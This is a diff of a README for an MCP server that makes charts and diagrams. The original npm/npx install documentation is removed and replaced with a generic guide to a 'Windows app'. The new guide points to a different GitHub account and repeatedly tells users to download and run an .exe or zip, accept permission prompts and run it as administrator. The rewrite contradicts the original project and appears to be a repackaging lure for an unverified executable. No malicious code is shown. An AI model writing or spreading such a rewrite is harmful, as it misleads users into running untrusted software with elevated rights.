@@ -1,131 +1,263 @@
-# Generative UI MCP
+# 🧩 Generative-UI-MCP - Turn Prompts Into Visual UIs
 
-An MCP server that teaches AI models to generate interactive visualizations — charts, diagrams, mockups, and more.
+[![Download Generative-UI-MCP](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fergusalveolar205/Generative-UI-MCP)
 
-> Inspired by [Anthropic's Artifacts](https://www.anthropic.com/news/artifacts) and [Vercel's Generative UI](https://vercel.com/blog/ai-sdk-3-generative-ui). This server provides structured design guidelines so AI models produce consistent, streaming-safe, visually polished widgets.
+## 🚀 What This Tool Does
 
-## What it does
+Generative-UI-MCP is a Windows app helper for AI tools. It helps AI models create interactive visuals from plain text prompts.
 
-Instead of stuffing thousands of tokens of design rules into every system prompt, this MCP server lets the model **load guidelines on demand** — only when it actually needs to generate a visualization.
+You can use it to make:
 
-| Module | What it covers |
-|--------|---------------|
-| `interactive` | HTML controls, forms, sliders, calculators |
-| `chart` | Chart.js patterns, canvas setup, interactive data controls |
-| `mockup` | UI mockup layouts, component patterns |
-| `art` | SVG illustrations, artistic visualizations |
-| `diagram` | Flowcharts, timelines, hierarchies, cycle diagrams, matrices |
+- Charts
+- Diagrams
+- UI mockups
+- SVG graphics
+- Simple visual layouts
 
-The model calls `load_ui_guidelines` with the modules it needs, and gets back comprehensive design specs including:
-- Core design system (philosophy, streaming rules, CSS variables)
-- Color palette (6 ramps with semantic usage rules)
-- Component patterns and code templates
-- SVG setup guides with arrow markers and viewBox calculations
-- 8 diagram types with layout rules and code examples
+It works as an MCP server, which means it sits between your AI app and the visual output it creates.
 
-## Quick start
+## 🖥️ What You Need
 
-### Auto-install via AI
+Before you start, make sure you have:
 
-Copy and paste the following prompt into your AI assistant (Claude Code, Cursor, etc.) to install automatically:
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- Enough free disk space for the app and its files
+- An AI app that can use MCP tools, such as Claude Desktop
+- Permission to install and run apps on your PC
 
-> Install the `generative-ui-mcp` MCP server. Run `npx generative-ui-mcp` as a stdio MCP server. The server name should be "generative-ui".
+## 📥 Download and Run
 
-### Claude Code
+Visit this page to download:
+https://github.com/fergusalveolar205/Generative-UI-MCP
 
-```bash
-claude mcp add generative-ui -- npx generative-ui-mcp
-```
+After the page opens:
 
-### Claude Desktop
+1. Look for the latest release or download file
+2. Download the Windows file to your PC
+3. Open the file you downloaded
+4. If Windows asks for permission, choose Run or Yes
+5. Follow the setup steps on screen
 
-Add to your `claude_desktop_config.json`:
+If the app comes as a folder or zip file:
 
-```json
-{
-  "mcpServers": {
-    "generative-ui": {
-      "command": "npx",
-      "args": ["generative-ui-mcp"]
-    }
-  }
-}
-```
+1. Right-click the file
+2. Select Extract All
+3. Open the extracted folder
+4. Find the main app file
+5. Double-click it to start
 
-### Cursor / Windsurf
+## ⚙️ First-Time Setup
 
-Add to your MCP settings (`.cursor/mcp.json` or equivalent):
+After you run the app for the first time, you may need to connect it to your AI app.
 
-```json
-{
-  "mcpServers": {
-    "generative-ui": {
-      "command": "npx",
-      "args": ["generative-ui-mcp"]
-    }
-  }
-}
-```
+Use these steps:
 
-## Tool
+1. Open your AI app
+2. Find the MCP or tools settings area
+3. Add a new MCP server entry
+4. Point it to Generative-UI-MCP
+5. Save your changes
+6. Restart the AI app if needed
 
-### `load_ui_guidelines`
+If the app asks for a local address, use the one shown in the app or in the setup file.
 
-Load detailed design guidelines for generating visual widgets.
+## 🎨 What You Can Create
 
-**Parameters:**
+Generative-UI-MCP is built for visual content. It can help the AI model produce:
 
-| Name | Type | Description |
-|------|------|-------------|
-| `modules` | `string[]` | Modules to load: `interactive`, `chart`, `mockup`, `art`, `diagram` |
+### 📊 Charts
+Use it for:
 
-**Example call:**
+- Bar charts
+- Line charts
+- Pie charts
+- Comparison graphs
+- Data dashboards
 
-```json
-{
-  "name": "load_ui_guidelines",
-  "arguments": {
-    "modules": ["chart", "diagram"]
-  }
-}
-```
+### 🧱 Diagrams
+Use it for:
 
-Shared sections (like Core Design System and Color Palette) are automatically deduplicated when loading multiple modules.
+- Flowcharts
+- Process maps
+- System diagrams
+- Decision trees
+- Relationship diagrams
 
-## Resource
+### 🪄 Mockups
+Use it for:
 
-### `generative-ui://system-prompt`
+- App screens
+- Web page layouts
+- Dashboard wireframes
+- Form layouts
+- Simple interface concepts
 
-A compact system prompt snippet (~300 tokens) with all hard constraints needed for valid widget output. Hosts can inject this into their system prompt so the model can generate basic widgets even without calling the tool.
+### 🖼️ SVG Graphics
+Use it for:
 
-Contains: output format, JSON escaping rules, streaming order, CDN allowlist, SVG setup, size limits, and interaction patterns.
+- Icons
+- Simple illustrations
+- Shapes
+- Labels
+- Clean vector art
 
-## How it works
+## 🧭 How to Use It
 
-```
-┌─────────────┐    system prompt     ┌─────────────┐
-│   AI Host   │ ◄── injects ──────── │  Resource:   │
-│ (Claude,    │     ~300 tokens      │ system-prompt│
-│  Cursor,    │                      └─────────────┘
-│  etc.)      │
-│             │    tool call          ┌─────────────┐
-│   Model ────│──► load_ui_          │  Guidelines  │
-│             │    guidelines         │  Modules     │
-│             │ ◄── returns ──────── │  (on demand) │
-│             │    detailed specs     └─────────────┘
-└─────────────┘
-```
+Once the app is running and connected:
 
-**Token savings:** The system prompt is ~300 tokens vs ~650+ tokens for full guidelines. Detailed specs are only loaded when the model actually needs to generate a visualization. Most conversations don't involve widgets, so this saves tokens on every request.
+1. Open your AI chat
+2. Ask for a visual
+3. Be clear about what you want
+4. Include labels, size, color, and layout if needed
+5. Review the result
+6. Ask for changes if it does not look right
 
-## Development
+Example requests:
 
-```bash
-npm install
-npm run build
-npm start
-```
+- Make a bar chart showing monthly sales
+- Create a simple app mockup for a task manager
+- Draw a flowchart for user sign-in
+- Build an SVG of a folder and search icon
+- Show a dashboard with three metrics and a trend line
 
-## License
+## 🧩 Good Prompt Tips
 
-MIT
+The AI works better when your request is specific.
+
+Try to include:
+
+- The type of visual
+- The number of items
+- The labels you want
+- The style you prefer
+- Any color choices
+- The size or layout
+
+Example:
+
+- Create a clean line chart with three series: signups, active users, and churn. Use blue, green, and red. Put the legend on the right.
+
+## 🛠️ Common Use Cases
+
+Generative-UI-MCP can fit many everyday tasks:
+
+- Product planning
+- Design drafts
+- Report visuals
+- Teaching and training
+- Quick concept reviews
+- UI idea generation
+
+It helps when you need a visual draft fast and do not want to build it by hand first.
+
+## 🔍 How It Fits With Claude and Other AI Apps
+
+This tool works with AI apps that support MCP.
+
+In practice, that means:
+
+1. The AI app sends a request
+2. Generative-UI-MCP handles the visual task
+3. The output comes back as a chart, diagram, or UI draft
+4. You can refine it with another prompt
+
+This setup is useful when you want the AI to do more than just write text.
+
+## 📁 File Types You May See
+
+Depending on the download package, you may see:
+
+- `.exe` files
+- `.zip` files
+- Config files
+- JSON files
+- SVG output files
+- Log files
+
+If you see a setup file, start with that one. If you see a folder, open the readme or config file inside it.
+
+## 🧰 Simple Troubleshooting
+
+If the app does not start:
+
+1. Check that the file finished downloading
+2. Try running it again as administrator
+3. Restart your PC
+4. Make sure your AI app is closed before setup
+5. Open the app again after setup
+
+If the AI app does not detect the server:
+
+1. Check the MCP settings
+2. Confirm the server path is correct
+3. Save the settings
+4. Restart the AI app
+5. Try the connection again
+
+If the visual looks wrong:
+
+1. Make the prompt shorter
+2. Add more labels
+3. State the layout you want
+4. Ask for one change at a time
+
+## 🔒 Safety and Local Use
+
+Generative-UI-MCP is designed for local use on your PC. It works with your AI app to generate visuals from your instructions.
+
+For the best experience:
+
+- Download only from the link above
+- Keep your AI app updated
+- Review any setup prompts before you confirm
+- Close unused apps if your PC feels slow
+
+## 🧾 Example Prompts
+
+Try these after setup:
+
+- Draw a simple diagram of how a newsletter signup flow works
+- Create a dashboard mockup with charts for revenue, users, and retention
+- Make a clean SVG of a cloud, arrow, and folder
+- Build a process chart for customer support ticket handling
+- Show a mobile app screen for a habit tracker
+
+## 🖱️ Windows Quick Steps
+
+If you want the shortest path:
+
+1. Open the download page
+2. Get the Windows file
+3. Run it
+4. Connect it to your AI app
+5. Ask for your first visual
+
+## 📌 Project Topic Areas
+
+This project focuses on:
+
+- AI
+- Charts
+- Claude
+- Diagrams
+- Generative UI
+- MCP
+- Model Context Protocol
+- SVG
+- Visualization
+
+## 📦 Download Again
+
+Visit this page to download:
+https://github.com/fergusalveolar205/Generative-UI-MCP
+
+## 🧪 Suggested First Test
+
+After setup, try this:
+
+1. Ask the AI for a basic bar chart
+2. Use three small categories
+3. Check that the output appears
+4. Ask for a color change
+5. Ask for a title change
